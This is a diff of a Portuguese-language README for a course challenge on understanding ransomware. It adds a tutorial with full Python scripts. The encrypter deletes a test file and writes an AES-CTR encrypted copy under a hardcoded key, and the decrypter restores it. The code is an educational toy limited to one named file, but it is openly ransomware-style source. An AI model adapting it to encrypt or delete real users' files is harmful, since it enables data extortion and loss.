@@ -1,29 +1,28 @@
-# Ransomware em Python 🔒
+# 🔒 Ransomware em Python – Desafio DIO
 
-Este projeto foi desenvolvido como parte do desafio **"Entendendo um Ransomware na Prática com Python"**. O objetivo é compreender, de forma educacional, como funciona um ransomware simples utilizando criptografia simétrica.
+Este projeto foi desenvolvido como parte do desafio "Entendendo um Ransomware na Prática com Python".
 
 > ⚠️ **Este código é exclusivamente para fins educacionais e de estudo.**  
-> **Nunca utilize este tipo de ferramenta em sistemas reais.**
+> **Nunca utilize este tipo de ferramenta em sistemas reais, sem autorização explícita.**
 
 ---
 
 ## 🎯 Objetivos
 
-- Implementar um script capaz de **criptografar** um arquivo usando o algoritmo AES no modo CTR.
-- Criar um script capaz de **descriptografar** o mesmo arquivo, desde que a chave correta seja fornecida.
+- Implementar um script capaz de **criptografar** um arquivo usando o algoritmo AES.
+- Criar um script capaz de **descriptografar** o mesmo arquivo.
 - Entender os riscos e mecanismos por trás de ataques de ransomware.
-- Praticar versionamento de código com **Git** e **GitHub**.
-- Documentar o raciocínio técnico de forma clara e profissional.
 
 ---
 
 ## 📁 Estrutura do Projeto
 
 ```
-├── encrypter.py     
-├── decrypter.py        
-├── teste.txt           
-└── README.md           
+.
+├── encrypter.py        # Script para criptografar o arquivo
+├── decrypter.py        # Script para descriptografar o arquivo
+├── teste.txt           # Arquivo de exemplo
+└── README.md           # Este arquivo
 ```
 
 ---
@@ -41,65 +40,161 @@ pip install pyaes
 
 ---
 
-## ▶️ Como Executar
+## 🚀 Passo a Passo: Criando seu Projeto Ransomware
 
-### 1. Crie o arquivo de teste
+### 1. Crie a pasta do projeto
 
-Crie um arquivo chamado `teste.txt` com o conteúdo:
+Abra o terminal e execute:
 
+```bash
+mkdir cibersecurity-desafio-ransomware
 ```
-alo brasil
+
+> Isso cria uma nova pasta chamada `cibersecurity-desafio-ransomware`.
+
+---
+
+### 2. Entre na pasta
+
+```bash
+cd cibersecurity-desafio-ransomware
 ```
 
-Você pode fazer isso via terminal:
+> Agora você está dentro da pasta do seu projeto.
 
-**Linux / macOS / WSL:**
+---
+
+### 3. Crie os arquivos necessários
+
+Execute os seguintes comandos para criar os arquivos vazios:
+
+```bash
+touch teste.txt
+touch encrypter.py
+touch decrypter.py
+```
+
+> Isso cria três arquivos: `teste.txt`, `encrypter.py` e `decrypter.py`.
+
+---
+
+### 4. Edite os arquivos com o código
+
+#### ➤ Edite o `encrypter.py`
+
+```bash
+nano encrypter.py
+```
+
+Cole o código abaixo, salve (`Ctrl+O` → Enter) e saia (`Ctrl+X`):
+
+```python
+import os
+import pyaes
+
+# Abrir o arquivo a ser criptografado
+file_name = 'teste.txt'
+file = open(file_name, 'rb')
+file_data = file.read()
+file.close()
+
+# Remover o arquivo original
+os.remove(file_name)
+
+# Definir a chave de criptografia
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+# Criptografar o arquivo
+crypto_data = aes.encrypt(file_data)
+
+# Salvar o arquivo criptografado
+new_file = file_name + '.ransomwaretroll'
+new_file = open(f'{new_file}', 'wb')
+new_file.write(crypto_data)
+new_file.close()
+
+print(f"✅ Arquivo '{file_name}' foi criptografado com sucesso como '{new_file}'.")
+```
+
+---
+
+#### ➤ Edite o `decrypter.py`
+
+```bash
+nano decrypter.py
+```
+
+Cole o código abaixo, salve e saia:
+
+```python
+import os
+import pyaes
+
+# Abrir o arquivo criptografado
+file_name = 'teste.txt.ransomwaretroll'
+file = open(file_name, 'rb')
+file_data = file.read()
+file.close()
+
+# Definir a chave de descriptografia (deve ser a mesma usada na criptografia)
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+# Descriptografar o arquivo
+decrypt_data = aes.decrypt(file_data)
+
+# Remover o arquivo criptografado
+os.remove(file_name)
+
+# Criar o arquivo descriptografado
+new_file = 'teste.txt'
+new_file = open(f'{new_file}', 'wb')
+new_file.write(decrypt_data)
+new_file.close()
+
+print(f"✅ Arquivo '{file_name}' foi descriptografado com sucesso como '{new_file}'.")
+```
+
+---
+
+#### ➤ Crie o conteúdo do `teste.txt`
+
 ```bash
 echo "alo brasil" > teste.txt
 ```
 
-**Windows (CMD):**
-```cmd
-echo alo brasil > teste.txt
+> Isso preenche o arquivo `teste.txt` com o texto “alo brasil”.
+
+---
+
+### 5. Instale a biblioteca `pyaes`
+
+No terminal, ainda dentro da pasta do projeto, execute:
+
+```bash
+pip install pyaes
 ```
 
-### 2. Criptografar o arquivo
+> Isso instala a biblioteca necessária para a criptografia AES.
 
-Execute o script de criptografia:
+---
+
+### 6. Teste os scripts
+
+Execute os scripts na ordem:
 
 ```bash
 python encrypter.py
-```
-
-Após a execução:
-- O arquivo `teste.txt` será **apagado**.
-- Um novo arquivo `teste.txt.ransomwaretroll` será criado com o conteúdo criptografado.
-
-### 3. Descriptografar o arquivo
-
-Execute o script de descriptografia:
-
-```bash
 python decrypter.py
 ```
 
-Após a execução:
-- O arquivo `teste.txt.ransomwaretroll` será **apagado**.
-- O arquivo original `teste.txt` será **restaurado** com o conteúdo `"alo brasil"`.
+> Você verá mensagens de sucesso e o arquivo `teste.txt` será restaurado.
 
 ---
 
-## 🔐 Sobre a Chave de Criptografia
+## 📌 Observações Importantes
 
 - A chave usada é: `b"testeransomwares"` (16 bytes).
-- O modo de operação é **AES-CTR** via a biblioteca `pyaes`.
-- **AES-CTR não requer padding**, o que o torna ideal para este exemplo simples.
-- Em um cenário real, a chave seria mantida em segredo pelo atacante — aqui, ela está hardcoded para fins didáticos.
-
----
-
-## 📚 Recursos Utilizados
-
-- Repositório base do instrutor: [github.com/cassiano-dio/cibersecurity-desafio-ransomware](https://github.com/cassiano-dio/cibersecurity-desafio-ransomware)
-- Apresentação do curso: *Criando um Ransomware em Python.pptx*
-- Documentação da biblioteca `pyaes`: [https://pypi.org/project/pyaes/](https://pypi.org/project/pyaes/)
+- O modo de operação é **AES-CTR**.
+- Este projeto é **apenas para aprendizado** — não é um ransomware real.
